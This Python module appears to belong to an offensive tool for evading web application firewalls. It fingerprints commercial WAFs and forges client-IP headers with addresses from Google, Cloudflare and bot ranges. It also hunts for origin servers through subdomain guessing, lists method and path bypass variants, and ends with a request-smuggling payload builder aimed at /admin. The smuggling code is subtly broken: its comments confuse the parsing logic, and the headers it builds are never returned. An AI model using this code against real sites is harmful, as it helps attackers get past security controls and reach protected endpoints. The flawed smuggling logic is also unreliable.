import random
import ipaddress
import socket
import logging
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
logger = logging.getLogger("usare.waf")
HIGH_REP_POOLS = {
    "google_dns": ["8.8.8.0/24", "8.8.4.0/24"],
    "cloudflare_dns": ["1.1.1.0/24", "1.0.0.0/24"],
    "opendns": ["208.67.222.0/24", "208.67.220.0/24"],
    "quad9": ["9.9.9.0/24"],
    "google_bot": ["66.249.64.0/19"],     
    "bing_bot": ["157.55.39.0/24"],       
    "apple": ["17.0.0.0/8"],              
}
WAF_SIGNATURES: Dict[str, Dict[str, List[str]]] = {
    "cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id"],
        "server_values": ["cloudflare"],
        "cookies": ["__cfduid", "__cf_bm", "cf_clearance"],
    },
    "akamai": {
        "headers": ["x-akamai-transformed", "akamai-grn", "x-akamai-request-id"],
        "server_values": ["akamaighost", "akamai"],
        "cookies": ["akamai_generated", "akaalb_"],
    },
    "aws_waf": {
        "headers": ["x-amz-cf-id", "x-amz-cf-pop", "x-amzn-requestid", "x-amzn-trace-id"],
        "server_values": ["awselb", "amazons3", "cloudfront"],
        "cookies": ["awsalb", "awsalbcors"],
    },
    "imperva": {
        "headers": ["x-iinfo", "x-cdn"],
        "server_values": ["imperva", "incapsula"],
        "cookies": ["incap_ses_", "visid_incap_"],
    },
    "f5_bigip": {
        "headers": ["x-cnection", "x-wa-info"],
        "server_values": ["bigip", "big-ip"],
        "cookies": ["bigipserver", "f5_cspm"],
    },
    "sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "server_values": ["sucuri"],
        "cookies": ["sucuri_cloudproxy"],
    },
    "barracuda": {
        "headers": ["barra_counter_session"],
        "server_values": ["barracuda"],
        "cookies": ["barra_counter_session"],
    },
    "fortinet": {
        "headers": [],
        "server_values": ["fortigate", "fortiweb"],
        "cookies": ["fortigate", "fortiweb"],
    },
}
@dataclass
class WAFDetectionResult:
    waf_detected: bool = False
    waf_name: Optional[str] = None
    waf_confidence: float = 0.0       
    evidence: List[str] = field(default_factory=list)
    origin_ip: Optional[str] = None   
    cdn_detected: bool = False
    cdn_name: Optional[str] = None
    def to_dict(self) -> dict:
        return {k: v for k, v in self.__dict__.items() if v}
class WAFBypass:
    def __init__(self):
        self._rng = random.SystemRandom()
    def detect_waf(self, response_headers: Dict[str, str]) -> WAFDetectionResult:
        result = WAFDetectionResult()
        best_match = None
        best_score: float = 0.0
        headers_lower = {k.lower(): v.lower() for k, v in response_headers.items()}
        server = headers_lower.get("server", "")
        cookies = headers_lower.get("set-cookie", "")
        for waf_name, sigs in WAF_SIGNATURES.items():
            score: float = 0.0
            evidence: List[str] = []
            for sig_header in sigs["headers"]:
                if sig_header in headers_lower:
                    score += 1
                    evidence.append(f"Header: {sig_header}")
            for sv in sigs["server_values"]:
                if sv in server:
                    score += 2  
                    evidence.append(f"Server: {sv}")
            for cookie_sig in sigs["cookies"]:
                if cookie_sig in cookies:
                    score += 1
                    evidence.append(f"Cookie: {cookie_sig}")
            if score > best_score:
                best_score = score
                best_match = (waf_name, evidence)
        if best_match and best_score >= 1:
            result.waf_detected = True
            result.waf_name = best_match[0]
            result.evidence = best_match[1]
            result.waf_confidence = min(1.0, best_score / 4.0)
            if result.waf_name in ("cloudflare", "akamai", "aws_waf"):
                result.cdn_detected = True
                result.cdn_name = result.waf_name
        return result
    def spoof_headers(
        self,
        target_domain: Optional[str] = None,
        pool: str = "mixed",
    ) -> Dict[str, str]:
        spoofed_ip = self._get_spoofed_ip(pool)
        secondary_ip = self._get_spoofed_ip("google_dns")
        headers = {
            "X-Forwarded-For": spoofed_ip,
            "X-Real-IP": spoofed_ip,
            "X-Originating-IP": spoofed_ip,
            "X-Client-IP": spoofed_ip,
            "CF-Connecting-IP": spoofed_ip,       
            "True-Client-IP": spoofed_ip,          
            "X-Forwarded-Host": target_domain or "localhost",
            "Forwarded": f"for={spoofed_ip};proto=https",
            "X-Remote-IP": secondary_ip,
            "X-Remote-Addr": secondary_ip,
            "X-Cluster-Client-IP": secondary_ip,
            "User-Agent": self._random_chrome_ua(),
            "Accept": (
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/avif,image/webp,image/apng,*/*;q=0.8"
            ),
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Sec-Ch-Ua": (
                '"Not_A Brand";v="8", "Chromium";v="120", '
                '"Google Chrome";v="120"'
            ),
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
        }
        return headers
    def spoof_headers_for_waf(
        self,
        waf_name: str,
        target_domain: Optional[str] = None,
    ) -> Dict[str, str]:
        base_headers = self.spoof_headers(target_domain)
        if waf_name == "cloudflare":
            base_headers["CF-Connecting-IP"] = self._get_spoofed_ip("cloudflare_dns")
            base_headers["CDN-Loop"] = "cloudflare"
        elif waf_name == "akamai":
            base_headers["True-Client-IP"] = self._get_spoofed_ip("google_bot")
            base_headers["Pragma"] = "akamai-x-get-cache-key"
        elif waf_name == "aws_waf":
            base_headers["X-Forwarded-For"] = self._get_spoofed_ip("google_dns")
            base_headers["X-Amzn-Trace-Id"] = (
                f"Root=1-{random.randint(60000000, 70000000):08x}-"
                f"{random.getrandbits(96):024x}"
            )
        elif waf_name == "imperva":
            base_headers["X-Forwarded-For"] = self._get_spoofed_ip("google_bot")
        return base_headers
    def discover_origin_ip(
        self,
        domain: str,
    ) -> Optional[str]:
        origin_subdomains = [
            "direct", "origin", "backend", "api", "mail", "smtp",
            "ftp", "vpn", "staging", "dev", "test", "internal",
            "admin", "cpanel", "webmail", "pop", "imap",
            "ns1", "ns2", "old", "legacy", "www2",
        ]
        try:
            waf_ip = socket.gethostbyname(domain)
        except socket.gaierror:
            return None
        for sub in origin_subdomains:
            try:
                fqdn = f"{sub}.{domain}"
                resolved_ip = socket.gethostbyname(fqdn)
                if resolved_ip != waf_ip:
                    logger.info(
                        f"[USARE] Potential origin IP via {fqdn}: {resolved_ip}"
                    )
                    return resolved_ip
            except socket.gaierror:
                continue
        return None
    @staticmethod
    def get_method_bypass_variants() -> List[Dict[str, str]]:
        return [
            {"method": "GET", "path": "/"},
            {"method": "HEAD", "path": "/"},
            {"method": "OPTIONS", "path": "/"},
            {"method": "GET", "path": "//"},
            {"method": "GET", "path": "/./"},
            {"method": "GET", "path": "/%2e/"},
            {"method": "GET", "path": "/;/"},
            {"method": "CONNECT", "path": "/"},
            {"method": "TRACE", "path": "/"},
            {"method": "get", "path": "/"},
            {"method": "GeT", "path": "/"},
        ]
    def _get_spoofed_ip(self, pool: str = "mixed") -> str:
        if pool == "mixed":
            pool = self._rng.choice(list(HIGH_REP_POOLS.keys()))
        networks = HIGH_REP_POOLS.get(pool, HIGH_REP_POOLS["google_dns"])
        network = ipaddress.ip_network(self._rng.choice(networks))
        hosts = [str(h) for h in network.hosts()]
        return str(self._rng.choice(hosts))
    def _random_chrome_ua(self) -> str:
        chrome_versions = [
            "120.0.0.0", "119.0.0.0", "121.0.0.0", "118.0.0.0", "122.0.0.0",
        ]
        version = self._rng.choice(chrome_versions)
        return (
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{version} Safari/537.36"
        )

class TECLSmuggler:
    """
    HTTP/2 Request Smuggling (TE.CL)
    Exploits discrepancies between frontend WAF HTTP/2 parsing and backend HTTP/1.1 parsing.
    If the frontend uses TE and backend uses CL, we can smuggle a hidden recon probe.
    """
    def __init__(self, target_host: str):
        self.target_host = target_host

    def generate_smuggled_payload(self, smuggled_path: str = "/admin") -> bytes:
        """
        Generates a TE.CL payload where the frontend sees a standard POST,
        but the backend sees a second independent GET request to `smuggled_path`.
        
        Note: True HTTP/2 smuggling requires generating the actual HPACK binary frames.
        This provides the unencoded frame payload that an HTTP/2 client would send.
        """
        smuggled_request = (
            f"GET {smuggled_path} HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"X-Smuggled: True\r\n"
            f"Connection: Keep-Alive\r\n\r\n"
        )
        
        smuggled_len = len(smuggled_request)
        
        # TE.CL: Transfer-Encoding takes precedence in the WAF (reads chunked),
        # Content-Length takes precedence in the backend (reads exactly '4' bytes, leaving the rest as a new request).
        body = (
            "4\r\n"
            "PING\r\n"
            "0\r\n\r\n"
            f"{smuggled_request}"
        )
        
        # We tell the backend the body is only 4 bytes long ("4\r\n").
        # The backend processes "4\r\n", leaves "PING\r\n0\r\n\r\n" and our smuggled request in the buffer,
        # which it then parses as the start of the NEXT HTTP pipeline request.
        
        headers = {
            ":method": "POST",
            ":path": "/",
            ":authority": self.target_host,
            ":scheme": "https",
            "content-type": "application/x-www-form-urlencoded",
            "transfer-encoding": "chunked",
            "content-length": "4"
        }
        
        return body.encode()